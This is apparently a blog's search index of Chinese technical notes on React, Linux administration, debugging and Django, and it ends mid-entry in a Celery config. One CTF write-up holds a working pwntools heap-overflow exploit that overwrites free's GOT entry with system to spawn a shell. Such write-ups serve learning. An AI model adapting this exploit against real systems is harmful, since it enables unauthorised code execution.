<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【develop】React开发者的6个tips]]></title>
    <url>%2F2018%2F09%2F28%2F%E3%80%90develop%E3%80%91React%E5%BC%80%E5%8F%91%E8%80%85%E7%9A%846%E4%B8%AAtips%2F</url>
    <content type="text"><![CDATA[Tips 使用函数式组件 保持组件尽量小 合适处理”this” “setState”中使用函数，而不是对象 使用”prop-types” 浏览器安装”React Developer Tools” 使用函数式组件 更少的代码 更容易理解 无状态 容易分解出更小的组件 保持组件尽量小 更容易阅读、测试、重复使用 12345678910111213141516171819202122class Comment extends Component &#123;render() &#123; return ( &lt;div className="Comment"&gt; &lt;div className="UserInfo"&gt; &lt;img className="Avatar"&gt; src=&#123;this.props.user.avatarUrl&#125; alt=&#123;this.props.user.name&#125; /&gt; &lt;div className="User-Name"&gt; &#123;this.props.user.name&#125; &lt;/div&gt; &lt;div className="Comment-text"&gt; &#123;this.props.text&#125; &lt;/div&gt; &lt;div className="Comment-date"&gt; &#123;formatDate(this.props.date)&#125; &lt;/div&gt; &lt;/div&gt; );&#125;&#125; 分解出更小的组件 123456789101112131415161718function UserInfo(props)&#123; return ( &lt;div className="UserInfo"&gt; &lt;Avatar user=&#123;props.user&#125;&gt; &lt;div className="User-Name"&gt; &#123;props.user.name&#125; &lt;/div&gt; );&#125;function Avatar(props)&#123; return ( &lt;img className="Avatar"&gt; src=&#123;props.user.avatarUrl&#125; alt=&#123;props.user.name&#125; /&gt; );&#125; 合适处理”this”使用ES6，组件类不会自动绑定内部函数。 渲染时绑定或使用 arrow function 123456render() &#123; return ( &lt;button onClick=&#123;this.logMessage.bind(this)&#125;/&gt; &lt;button onClick=&#123;() =&gt; this.logMessage()&#125;/&gt; );&#125; 构造时绑定 12345678910constructor(props) &#123; super(props); this.logMessage = this.logMessage.bind(this);&#125;render() &#123; return ( &lt;button onClick=&#123;this.logMessage&#125;/&gt; );&#125; 函数定义arrow function 123456789logMessage = () =&gt; &#123; console.log("test")&#125;render() &#123; return ( &lt;button onClick=&#123;this.logMessage&#125;/&gt; );&#125; “setState”中使用函数，而不是对象12345this.setState(&#123;correctData: !this.state.correctData&#125;)this.setState((prevState, props) =&gt; &#123; return &#123;correctData: !prevState.correctData&#125;);&#125; 使用函数第一个参数获取prevState，第二个参数porps。 使用”prop-types”“prop-types”是一个库，检查props的类型 12345678910111213import PropTypes from "prop-types";class Welcome extends Component &#123; reder() &#123; return ( &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; ); &#125;&#125;Welcome.propTypes = &#123; name: propTypes.string.isRequired&#125; 浏览器安装”React Developer Tools”Ref: https://www.youtube.com/watch?v=xa-_FIy2NgE]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】rsyslog配置]]></title>
    <url>%2F2018%2F08%2F10%2F%E3%80%90note%E3%80%91rsyslog%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Linux日志机制的核心是rsyslog守护进程，该服务负责监听Linux下的日志信息，并把日志信息追加到对应的日志文件中，一般在/var/log目录下。它还可以把日志信息通过网络协议发送到另一台Linux服务器上。 配置文件rsyslog的配置文件为/etc/rsyslog.conf和/etc/rsyslog.d/*.conf。 服务器上存储的日志文件可以按天进行存储示例配置如下： /etc/rsyslog.d/work.conf 1234# Create dynamic file template$template DynLogs,"/var/log/app/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log"# save localhostlocal5.alert ?DynLogs rsyslog 接收local5程序alert及其以上事件的日志，存放在/var/log/app路径，通过年月日命名文件的方式实现按日期存储日志。 指定日志信息格式配置示例如下： 12345# Create dynamic file template$template DynLogs,"/var/log/app/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log" *$template GRAYLOGRFC5424,"&lt;%PRI%&gt;%PROTOCOL-VERSION% %TIMESTAMP:::date-rfc3339% %HOSTNAME% %APP-NAME% %PROCID% %MSGID% %STRUCTURED-DATA% %msg%\n"# save localhostlocal5.alert ?DynLogs;GRAYLOGRFC5424 转发到远程服务器配置示例如下： 12345678910# forwarding ymon log to remote server$WorkDirectory /var/lib/rsyslog # where to place spool files$ActionQueueFileName fwdWORK # unique name prefix for spool files$ActionQueueMaxDiskSpace 4g # 1gb space limit (use as much as possible)$ActionQueueSaveOnShutdown on # save messages to disk on shutdown$ActionQueueType LinkedList # run asynchronously$ActionResumeRetryCount -1 # infinite retries if host is downlocal5.alert @@172.16.40.12:514&amp; ~ 远程服务器rsyslog配置,同样设置按天进行存储 123456789#### MODULES #### # Provides TCP syslog reception$ModLoad imtcp$InputTCPServerRun 514#$AllowedSender tcp, 10.6.1.0/24$template RemoteLogs,"/var/log/%HOSTNAME%/%PROGRAMNAME%_%$YEAR%-%$MONTH%-%$DAY%.log" *local5.alert ?RemoteLogs&amp; ~ 若开启防火墙，则需配置 123456vim /etc/sysconfig/iptables # ssh 配置行下添加一行 ssh: -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 514 -j ACCEPTservice iptables restart]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】centos6 升级gcc和g++]]></title>
    <url>%2F2018%2F08%2F03%2F%E3%80%90note%E3%80%91centos6-%E5%8D%87%E7%BA%A7gcc%E5%92%8Cg%2F</url>
    <content type="text"><![CDATA[对 gcc或g++ 升级无法直接使用： 1yum update gcc 以下是升级的详细过程。 1.使用 redhat developer toolset 2 的repo，安装GCC123cd /etc/yum.repos.dwget https://people.centos.org/tru/devtools-2/devtools-2.repoyum --enablerepo=testing-2-devtools-6 install devtoolset-2-gcc devtoolset-2-gcc-c++ 2. 替换系统中原来的GCC通过通过第一步会把 GCC 安装到以下目录： 1/opt/rh/devtoolset-2/root/usr/bin/ 接下来需要修改系统的配置，使默认的 gcc 和 g++ 命令使用的是新安装的版本。 12ln -s /opt/rh/devtoolset-2/root/usr/bin/* /usr/local/bin/hash -r 现在查看 g++ 的版本号： 12345g++ --versiong++ (GCC) 4.8.2 20140120 (Red Hat 4.8.2-15)Copyright (C) 2013 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. g++版本升级到4.8.2了。 3. 副作用gcc 4.8生成“rep;ret”指令，避免AMD芯片的性能损失，而老版的assemblers会识别为错误，解决方法是更新binutils，使用更新的assemblers接受此指令。参考：https://gcc.gnu.org/ml/gcc-help/2011-03/msg00286.html 1yum install -y devtoolset-2-binutils-devel 更优雅的方式centos为了稳定性，发行版的软件版本通常都比较低，为了解决用户使用软件不同版本的需求，RedHat 推出 Software Collections，更多说明可自行谷歌。 解决上述更新gcc版本，可以使用 devtoolset + scl, devtoolset不同的版本内置了不同版本的gcc等多个软件包，devtoolset-3使用的是gcc4.9.2的版本。 安装scl支持: yum install scl-utils 例如在bash命令中更新使用的gcc，如scl enable devtoolset-3 bash, 这点和python的venv很类似。如果只是一次性使用，可以使用以下命令：scl enable devtoolset-3 &quot;gcc --version&quot;]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】linux上限制进程cpu占用率]]></title>
    <url>%2F2018%2F07%2F30%2F%E3%80%90note%E3%80%91linux%E4%B8%8A%E9%99%90%E5%88%B6%E8%BF%9B%E7%A8%8Bcpu%E5%8D%A0%E7%94%A8%E7%8E%87%2F</url>
    <content type="text"><![CDATA[linux上限制进程cpu占用率，可以使用cgroups或者cpulimit，这两种方式经实践能有效限制cpu的占用。cgroups现已集成到大多数linux中，简单配置即可实现各种对进程资源的配置，优先推荐使用该方式，系统资源消耗少，且稳定可靠，配置方式灵活。cpulimit是一个开源工具，github地址为 https://github.com/opsengine/cpulimit。cpulimit利用信号机制暂停和恢复进程的运行，并不直接操作内核。 cgroupscgroups 目的是对进程进行资源管理,涉及以下概念： task：任务，对应于系统中运行的一个实体，一般是指进程 subsystem：子系统，具体的资源控制器（resource class 或者 resource controller），控制某个特定的资源使用。比如 CPU 子系统可以控制 CPU 时间，memory 子系统可以控制内存使用量 cgroup：控制组，一组任务和子系统的关联关系，表示对这些任务进行怎样的资源管理策略 hierarchy：层级树，一系列 cgroup 组成的树形结构。每个节点都是一个 cgroup，cgroup 可以有多个子节点，子节点默认会继承父节点的属性。系统中可以有多个 hierarchy 更多介绍参考: redhat CGROUPS 以下使用实例方式，介绍使用cgroups区分用户限制进程对cpu的占用率。 系统：centos 6.5 cpu数：2 目标 test 用户进程cpu 100% （单cpu) 其他任意用户进程cpu 60% (单cpu) 新建test用户123456789/usr/sbin/adduser testpasswd test# test用户赋予sudo权限/usr/sbin/visudo# User privilege specificationroot ALL=(ALL) ALLtest ALL=(ALL) ALL 配置cgroups12345678910111213141516yum install -y libcgroupservice cgconfig start# 查看子系统ls /cgroupblkio cpu cpuacct cpuset devices freezer memory net_clslscgroupcpuset:/cpu:/cpuacct:/memory:/devices:/freezer:/net_cls:/blkio:/ 配置cgconfig 12345678910111213141516vim /etc/cgconfig.conf# appendgroup limitcpu &#123; cpu &#123; cpu.cfs_quota_us = 6000; cpu.cfs_period_us = 10000; &#125;&#125;group user &#123; cpu &#123; cpu.cfs_quota_us = 10000; cpu.cfs_period_us = 10000; &#125;&#125; 配置cgrules 12345vim /etc/cgrules.conf# appendtest cpu user/* cpu limitcpu/ 服务启动和自启 1234service cgconfig restartchkconfig cgconfig onservice cgred startchkconfig cgred on cpulimit从github下载源码，make编译，会在src目录生成可执行程序cpulimit. 对进程 xxx (pid:1234)限制cpu占用率为 30%，可以使用以下命令 12./cpulimit -p 1234 -l 30./cpulimit -e xxx -l 30 cpulimit原理比较简单，计算进程cpu的占用时间，然后调用kill(pid,SIGSTOP)和kill(pid,SIGCONT)来暂停和恢复进程，在此期间调用nanosleep后台挂起，避免cpulimit过多占用cpu时间。 参考 Linux 内核 cgroups 简介 How To Limit Resources Using cgroups on CentOS 6]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】centos6.5安装weblogic]]></title>
    <url>%2F2018%2F07%2F22%2F%E3%80%90note%E3%80%91centos6-5%E5%AE%89%E8%A3%85weblogic%2F</url>
    <content type="text"><![CDATA[下载bin安装包weblogic 10.3.6 linux可执行文件下载地址 http://download.oracle.com/otn/linux/middleware/11g/wls/1036/wls1036_linux32.bin 安装首先建立weblogic用户 12345groupadd -g 900 weblogicuseradd -u 900 -g weblogic weblogicmkdir /usr/local/weblogicchown -R weblogic.weblogic /usr/local/weblogic/yum install -y glibc.i686 libstdc++.so.6 将本地主机名解析为127.0.0.1 否则会出现Weblogic：Could not obtain the localhost address问题 1234echo &quot;127.0.0.1 $(hostname)&quot; &gt;&gt; /etc/hosts# 安装操作都以weblogic用户进行su - weblogic 安装weblogic 参考: CentOS 6通过bin安装包安装Weblogic 安装路径为: /usr/local/weblogic 免密启动 安装完后先运行startWebLogic.sh脚本，会在base_domin目录下生成servers目录，然后设置免密登陆，假设用户名为weblogic, 密码为weblogic123 12345cd /usr/local/weblogic/user_projects/domains/base_domain/servers/AdminServer/mkdir securityvim security/boot.properties username=weblogic password=weblogic123 重启weblogic 设置自启动 1234# 设置日志文件路径touch /var/log/weblogic.logchown weblogic:weblogic /var/log/weblogic.logvim /etc/init.d/weblogic 1234567891011121314151617181920212223242526272829303132333435363738394041#!/bin/bash#chkconfig:35 99 05#description:Weblogic Server#/ect/init.d/weblogic#Please edit the Variableexport WLS_HOME=/usr/local/weblogic/user_projects/domains/base_domainexport WLS_LOG=/var/log/weblogic.logexport PATH=$PATH:$WLS_HOME/binWLS_OWNER="weblogic"if [ ! -f$WLS_HOME/bin/startWebLogic.sh -o ! -d $WLS_HOME ]then echo "WebLogic startup:cannot start" exit 1fi# depending on parameter -- startup,shutdown,restartcase "$1" instart) echo -n "Starting Weblogic:log file $WLS_LOG" touch /var/lock/weblogic su - $WLS_OWNER -c "nohup sh $WLS_HOME/bin/startWebLogic.sh &gt; $WLS_LOG 2&gt;$1 &amp;" echo " OK" ;;stop) echo -n "Shutdown Weblogic:" rm -rf /var/lock/weblogicsu - $WLS_OWNER -c "sh $WLS_HOME/bin/stopWebLogic.sh &gt;&gt; $WLS_LOG"# killall -9 java echo " OK" ;;reload|restart) $0 stop $0 start ;;*) echo "Usage: `basename $0` start|stop|restart|reload" exit 1esacexit 0 123456chmod a+x/etc/init.d/weblogic# 测试服务方式启动service weblogic start# 配置服务自启动chkconfig weblogic on 踩过的坑编写服务文件，调用weblogic启动脚本要放到后台执行，否则会阻塞之后的服务启动，比如ssh服务。 1234# 错误的方式，服务调用放在前台执行su - $&#123;WLS_OWNER&#125; -c "cd $&#123;WLS_HOME&#125;; ./startWebLogic.sh"# 正确的方式，服务调用放在后台执行su - $&#123;WLS_OWNER&#125; -c "cd $&#123;WLS_HOME&#125;; ./startWebLogic.sh &amp;"]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【note】clion远程调试]]></title>
    <url>%2F2018%2F07%2F19%2F%E3%80%90note%E3%80%91clion%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[mac上使用CLION远程调试centos上的C或C++可执行程序，clion使用GDB Remote Debug进行配置。 宿主机： OSX 10.13.6 虚拟机：CentOS 6.5 x64 虚拟机基本配置首先在CentOS上安装必备的软件，包括 gcc, gcc-c++, gdb gdbserver, cmake, make。其中gcc-c++是用来编译cpp, cmake是由于clion使用cmake进行构建，因此CentOS上也要使用cmake来进行构建，保证本地和虚拟机的文件一致，在clion上使用GDB Remote Debug 进行远程调试。 1yum install -y gcc gcc-c++ make cmake gdb gdb-gdbserve cmake 构建假设代码的根目录：/root/work/hello， 源代码为单文件main.cpp 项目目录下编写CMakeLists.txt文件 123456789101112131415161718# Make 最低版本号要求cmake_minimum_required(VERSION 2.8)# 项目信息project(hello)# 指定源文件set(SOURCE_FILES main.cpp)set(CMAKE_SOURCE_DIR .)# 配置gdb调试set(CMAKE_BUILD_TYPE &quot;Debug&quot;)set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV&#123;CXXFLAGS&#125; -O0 -Wall -g3 -ggdb&quot;)set(CMAKE_CXX_FLAGS_RELEASE &quot;$ENV&#123;CXXFLAGS&#125; -O3 -Wall&quot;)# 指定生成目标add_executable(hello $&#123;SOURCE_FILES&#125;) 使用cmake构建 12345cd /root/work/hellomkdir buildcd buildcmake .. make 在根目录下生成build目录，存放cmake构建的结果，其中包含生成的Makefile文件，然后使用make命令，会在build目录中生成可执行文件hello。 运行gdbserver 1gdbserver 0.0.0.0:1234 /root/work/hello/build/hello Mac 远程连接调试将虚拟机上的构建完成的整个项目文件拷贝到Mac上，存放路径为/Users/xxxuser/Pictures/hello 使用clion打开，配置debug选项为GDB Remote Debug。 1234GDB: Bundled GDB multiarch&apos;target remote&apos; args: tcp:172.16.40.130:1234Symbol file: /Users/xxxuser/Pictures/hello/build/helloPath mapping: /root/work/hello /Users/xxxuser/Pictures/hello ‘target remote’ 参数中 172.16.40.130 为虚拟机的ip地址。 然后点击调试按钮，若连接上gdbserver, Console会显示 Debugger connected to tcp:172.16.40.130:1234。gdbserver 也会显示相应的连接信息。之后就可以愉快的使用clion进行远程调试了。 踩坑之旅上面的步骤基本可以实现正常调试的功能。当然为了达成这个目标也是踩了不少坑，记录一下，备忘或给他人提供一些参考。 clion gdb 连不上。clion进行远程调试，出现连接不上的问题，结果如下 12tcp:172.16.40.130:1234: Operation timed out.Debugger disconnected 在mac上可以ssh登录虚拟机，但是clion死活连不上虚拟机的gdbserver。排除clion软件的代理等问题，首先在虚拟机上使用gdb进行远程连接 1234567$gdb(gdb) target remote 127.0.0.1:1234(gdb) q$gdb(gdb) target remote 172.16.40.130:1234(gdb) q 在虚拟机上使用gdb连接127.0.0.1和172.16.40.130两种方式进行连接，发现可以连上127.0.0.1，不能连上172.16.40.130，那么很可能是iptables的问题，禁用iptables后连接正常。 配置CentOS关闭防火墙 12service iptables stopchkconfig iptables off No source file named main.cpp 问题 第一种 CMake 源文件路径配置 当CMakeLists.txt中未配置源文件路径时，clion启动gdb时，Debugger-&gt;GDB页面会出现No source file named main.cpp。 例如之前的错误配置为： 12345678910111213# Make 最低版本号要求cmake_minimum_required(VERSION 2.8)# 项目信息project(hello)# 配置gdb调试set(CMAKE_BUILD_TYPE &quot;Debug&quot;)set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV&#123;CXXFLAGS&#125; -O0 -Wall -g3 -ggdb&quot;)set(CMAKE_CXX_FLAGS_RELEASE &quot;$ENV&#123;CXXFLAGS&#125; -O3 -Wall&quot;)# 指定生成目标add_executable(hello main.cpp) 在CMakeLists.txt文件中添加set(SOURCE_FILES main.cpp)指定源文件，解决读取不到main.cpp的问题 第二种 程序编译选项 clion正常连接gdbserver后，在main.cpp文件中设置断点，出现No source file named main.cpp, 并且程断点也无效。 对应的cmake文件配置为set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV{CXXFLAGS} -O0 -Wall -g -ggdb&quot;),使用的是-g选项, 经过网上一番搜索，设置-g3选项生效，即set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV{CXXFLAGS} -O0 -Wall -g3 -ggdb&quot;)。其中-g对应的是-g2, -g3产生更多的调试信息，例如-g3级别支持宏扩展。 可能是clion远程调试需要更多的调试信息，-g2级别不够，设置成-g3后就可以正常下断点调试，和本地调试无异。 备注 cmake不是必须的 虽然clion默认使用cmake构建，使用gdbserver进行远程调试，可以不使用cmake构建，构建工具不重要，只要满足源码目录和二进制程序，本地和远程相同即可。文中先前理解有误，特此修正。]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【note】CentOS免密登录问题排查]]></title>
    <url>%2F2018%2F07%2F19%2F%E3%80%90note%E3%80%91CentOS%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[CentOS 6.5 免密登陆问题排查，服务器ssh服务器运行正常，使用用户名和密码登陆服务器正常，但是使用秘钥登陆一直失败，于是先排查sshd配置文件/etc/ssh/sshd_config,支持秘钥认证登陆 123RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys 修改文件重启ssh服务后，仍旧不能免密登陆。于是排查各文件和文件夹权限，修改为 123drwx------. 3 root root 4096 7月 18 20:22 /rootdrwx------. 2 root root 4096 7月 18 22:56 .ssh-rw-------. 1 root root 396 7月 18 22:56 authorized_keys 还是不行，从客户端ssh -v显示的信息依旧看不出什么问题，接下来排查ssh服务器日志。 ssh 服务器日志排查ssh服务器日志位于 /var/log/secure，默认日志记录的INFO信息，需要修改日志记录级别为DEBUG，修改/etc/ssh/sshd_config文件中LogLevel INFO 为 LogLevel DEBUG，重启ssh服务器service sshd restart。 尝试ssh登陆，发现问题在于不能读取authorized_keys 12Jul 18 23:01:05 centos sshd[1564]: debug1: trying public key file /root/.ssh/authorized_keysJul 18 23:01:05 centos sshd[1564]: debug1: Could not open authorized keys &apos;/root/.ssh/authorized_keys&apos;: Permission denied 参考 https://stackoverflow.com/questions/20688844/sshd-gives-error-could-not-open-authorized-keys-although-permissions-seem-corre，问题在于SELinux阻止sshd打开文件。 执行：restorecon -FRvv ~/.ssh， 解决问题。 问题分析该问题本质应该是authorized_keys文件的context不正确，正常情况下应该是ssh_home_t，如果是admin_home_t则是错误的。可以使用estorecon命令进行恢复。 1234[root@centos ~]# ls -alZ .ssh/drwx------. root root system_u:object_r:ssh_home_t:s0 .drwx------. root root system_u:object_r:admin_home_t:s0 ..-rw-------. root root system_u:object_r:ssh_home_t:s0 authorized_keys]]></content>
      <categories>
        <category>note</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【develop】django 同表GroupBy排序查询]]></title>
    <url>%2F2018%2F01%2F09%2F%E3%80%90develop%E3%80%91django-%E5%90%8C%E8%A1%A8GroupBy%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[通常django中涉及group by查询多是多个表之间的联合查询，使用外键搭建桥梁。碰到过同表group by查询的案例，发现弄起来还挺麻烦的，故记录下，涨涨见识。 django annotatedjango annotate注解功能可以用在多个表的分组统计，也可以用在同表的分组统计。 如果需要统计某个字段出现的数量需要使用’values’. If you just need the total number of events for a single area, you don’t need either annotate or aggregate, a simple count will do:SomeModel.objects.filter(some_colname=xx_colname).count() If you want the count of events for multiple areas, you need annotate in conjunction with values:SomeModel.objects.values(&#39;some_colname&#39;).annotate(num_col=Count(&#39;some_colname&#39;)) 也就是说，如果要用某个字段出现的次数排序的话，通常这样使用：SomeModel.objects.values(&#39;some_colname&#39;).annotate(num_col=Count(&#39;some_colname&#39;)).order_by(&#39;-num_col&#39;),这样做是没有问题的，但是返回的字段中就只有some_colname字段了，不能做到返回所有字段，或任意指定的字段。如果要满足这个条件，目前使用的是原生的sql语句，参考: https://stackoverflow.com/questions/2283305/order-by-count-per-value 123sql = ('select a.* from some_table a join(select xx_id, count(*) as cnt from some_table ' 'group by xx_id)b on (b.xx_id=a.xx_id) order by b.cnt desc')records = SomeModel.objects.raw(sql)]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>django</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Tool】常用工具整理]]></title>
    <url>%2F2017%2F12%2F27%2F%E3%80%90Tool%E3%80%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[在线工具 ipip.net 在线编程 JSON在线格式化 shell在线语法检测 代码转图片 威胁情报平台 threat crowd 360威胁情报中心 微步在线 AlienVault 启明星辰 VenusEye 恶意软件分析 Free Automated Malware Analysis Service - powered by Falcon Sandbox virustotal cuckoo 哈勃分析系统 数据包分析工具 wireshark tcpdump 客户端 Valentina Studio: 跨平台数据库管理 指纹识别工具 nmap masscan zmap Wappalyzer shodan 入侵检测 snort suricata bro ossec ossim security onion 代理工具 Burp Suite 漏洞扫描利用工具 sqlmap metasploit 其他工具 shootback: a reverse TCP tunnel covertutils: A framework for Backdoor]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】shellman堆溢出]]></title>
    <url>%2F2017%2F12%2F21%2F%E3%80%90CTF%E3%80%91shellman%E5%A0%86%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[题目来自于2015年强网杯的一道二进制题目shellman, 程序流程很清晰，阅读ida逆向后的代码很容易发现在编辑shellcode时存在溢出，一道很明显的堆溢出二进制漏洞，至于怎么利用，初始想的是利用fastbin attackg攻击，改掉shellcode管理中记录分配的地址，再利用edit功能，修改给出的函数的got地址，改为shellcode地址，后来发现开启的堆栈保护，不能利用，由于堆内容是可控的，结合delete功能，修改free函数的got地址为system地址，system执行堆上的命令，具体细节网上也很多，可参考后文链接，只是网上的都是基于堆溢出+unlink的攻击方式，这里给出堆溢出加fastbin attack的攻击方法, 详情见POC. POC 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# -*- coding: utf-8 -*-from pwn import *context.arch='amd64'context.os='linux'context.word_size = 64context.log_level = 'debug'io = process('./shellman')stack_addr = 0x6016C0 + 8*3*2free_got_addr = 0x601600system_offset_free = -258400 # ubuntu16.04 glibc 2.2.5def new_code(code): io.recvuntil('&gt; ') io.sendline('2') io.recvuntil(': ') io.sendline(str(len(code))) io.recvuntil(': ') io.send(code)def delete_code(idx): io.recvuntil('&gt; ') io.sendline('4') io.recvuntil(': ') io.sendline(str(idx))def edit_code(idx, code): io.recvuntil('&gt; ') io.sendline('3') io.recvuntil(': ') io.sendline(str(idx)) io.recvuntil(': ') io.sendline(str(len(code))) io.recvuntil(': ') io.send(code)def list_code(): io.recvuntil('&gt; ') io.sendline('1')new_code('A'*32)new_code('A'*16)new_code('A'*32)delete_code(1)overflow = 'A'*32 + p64(1)+p64(33)+p64(stack_addr)edit_code(0, overflow)new_code('/bin/sh\x00')new_code(p64(free_got_addr))list_code()io.recvuntil('SHELLC0DE 2: ')free_addr = io.recvline().strip()[:16]addrs = []for i in range(0, len(free_addr), 2): addrs.append(free_addr[i:i+2])addrs.reverse()free_addr = ''.join(addrs)print 'leak libc free addr: ' + free_addrsystem_addr = int(free_addr, 16) + system_offset_freeedit_code(2, p64(system_addr))delete_code(1)io.interactive() REF 伪造堆块绕过unlink检查 ctf-QiangWangCup-2015-shellman linux堆溢出实例分析]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>堆溢出</tag>
        <tag>fastbin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】Linux加载动态链接库]]></title>
    <url>%2F2017%2F12%2F19%2F%E3%80%90note%E3%80%91Linux%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%2F</url>
    <content type="text"><![CDATA[LIBRARY_PATH 和 LD_LIBRARY_PATHLIBRARY_PATH和LD_LIBRARY_PATH是Linux下的两个环境变量，二者的含义和作用分别如下： LIBRARY_PATH环境变量用于在*程序编译期间*查找动态链接库时指定查找共享库的路径，例如，指定gcc编译需要用到的动态链接库的目录。 LD_LIBRARY_PATH环境变量用于在*程序加载运行期间*查找动态链接库时指定除了系统默认路径之外的其他路径，注意，LD_LIBRARY_PATH中指定的路径会在系统默认路径之前进行查找。 区别与使用： 开发时，设置LIBRARY_PATH，以便gcc能够找到编译时需要的动态链接库。 发布时，设置LD_LIBRARY_PATH，以便程序加载运行时能够自动找到需要的动态链接库。 GCC里的链接器的选项是 -rpath 和 -rpath-link 临时指定动态链接库 LD_LIBRARY_PATH 或 LD_PRELOAD 设置LD_LIBRARY_PATH 1export LD_LIBRARY_PATH=/home/xxx/Desktop:$LD_LIBRARY_PATH 其中 /home/plusls/Desktop 为so文件所在的目录 注：这样设置后 pwntools 起的进程也会继承该环境变量，加载此libc 设置LD_PRELOAD 终端设置LD_PRELOAD，指定程序运行要加载的动态链接库，如： 1LD_PRELOAD=./libc.so.6 ./app]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>动态链接库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【note】celery基本使用]]></title>
    <url>%2F2017%2F12%2F08%2F%E3%80%90note%E3%80%91celery%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Celery 是一个异步的分布式任务队列，主要用于实时处理和任务调度。不过它的消息中间件是默认选择使用 rabbitmq。 Celery 包含的组件： Celery Beat: 任务调度器，用来调度周期任务。 Producer: 任务生产者，调用 Celery 产生任务。 Broker: 消息中间件，任务消息存进队列，再按序发送给消费者。 Celery Worker: 执行任务的消费者，通常可以进行在多台服务器上运行多个消费者。 Result Backend: 任务处理完成之后保存状态信息和结果，一般是数据库。 Celery 产生任务的方式有两种 发布者发布任务 任务调度按时发布定时任务 Celery 的架构 样例 Requirement Python 2.7.12 pymongo&gt;=3.5.1 celery[msgpack]&gt;=4.1.0 文件配置和常见结构一致，相关配置均在celeryconfig,py文件中，处理的任务中有一个定时调度任务feeddog, worker任务eat, feeddog任务中调度eat任务去执行，feeddog可以作为中心节点管理，而eat任务可以作为分布式节点去执行。celeryconfig中单独配置了eat任务的存储后端。 app.py 1234567891011from __future__ import absolute_importfrom celery import Celeryapp = Celery('proj', include=['proj.tasks'])app.config_from_object('eyes.celeryconfig')if __name__ == '__main__': app.start() tasks.py 123456789101112131415161718192021222324from __future__ import absolute_importfrom celery import groupfrom .app import appfrom .scan.scans import nmap_scan@app.taskdef eat(a, b): return sum(a,b)@app.taskdef feeddog(): nums = ((1, 3), (2,4), (4, 8)) for a,b in nums: eat.delay(a, b)# or@app.taskdef feeddog(): nums = ((1, 3), (2,4), (4, 8)) dog_groups = ([eat.s(a, b) for a, b in nums]) dog_groups.delay() celeryconfig 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python# -*- coding: utf-8 -*-"""celery config, Ref:http://docs.celeryproject.org/en/master/userguide/configuration.html"""from datetime import timedeltafrom kombu import Queuefrom kombu import Exchangefrom celery.backends.mongodb import MongoBackendfrom .app import app# brokerbroker_url = 'pyamqp://guest@localhost:5672//'# result# http://docs.celeryproject.org/en/master/_modules/celery/backends/mongodb.htmlmongodb_url = 'mongodb://localhost/celery'result_backend = mongodb_url# mongodb_backend_settings = &#123;# 'database': 'proj', # databse name# 'taskmeta_collection': 'celery' # collection name# &#125;# special task backend setting collectioneat_backend = MongoBackend(app, url=mongodb_url)eat_backend.taskmeta_collection = 'celery_eat'# time of keeping resultresult_expires = 60 * 60 * 24# serializer, compare to json, msgpacker is smaller and better performance# task_serializer = 'msgpack'# result_serializer = 'msgpack'# accept_content = ['msgpack']timezone = 'Asia/Shanghai'enable_utc = True# task attribute setting# http://docs.celeryproject.org/en/latest/userguide/tasks.htmltask_annotations = &#123; # task : args 'proj.tasks.eat': &#123; 'rate_limit': '50/s', 'backend': eat_backend &#125;, 'proj.tasks.feeddog': &#123; 'ignore_result': True &#125;&#125;task_queues = ( Queue('feed', 